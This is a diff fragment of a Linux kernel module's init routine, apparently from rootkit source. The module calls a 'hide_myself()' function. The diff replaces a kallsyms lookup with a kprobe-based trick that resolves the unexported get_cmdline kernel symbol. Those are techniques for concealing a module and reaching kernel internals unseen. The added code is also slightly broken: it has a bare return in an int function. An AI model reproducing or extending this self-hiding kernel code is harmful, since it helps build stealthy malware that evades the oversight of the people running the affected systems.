@@ -335,13 +335,23 @@ static int __init hide_init(void)
     }
 
 	hide_myself();
-
+/*
 	if (my_get_cmdline == NULL) {
         my_get_cmdline = (void *) kallsyms_lookup_nameX("get_cmdline");
 		pr_info("pvm: cmdline bsdk wala found , plz compare in kallsym file");
 		// It can be NULL, because there is a fix below if get_cmdline is NULL
 	}
+*/
+	static struct kprobe kpc = {
+    .symbol_name = "get_cmdline",
+     };
 
+	if (register_kprobe(&kpc) < 0) {
+	    printk("kpm: cmdline bsdk not kprobed");
+        return;
+    }
+    my_get_cmdline = (int (*)(struct task_struct *task, char *buffer, int buflen)) kpc.addr;
+    unregister_kprobe(&kpc);
     // printk("driverX: this: %p", THIS_MODULE); /* TODO: remove this line */
     return 0;
 }
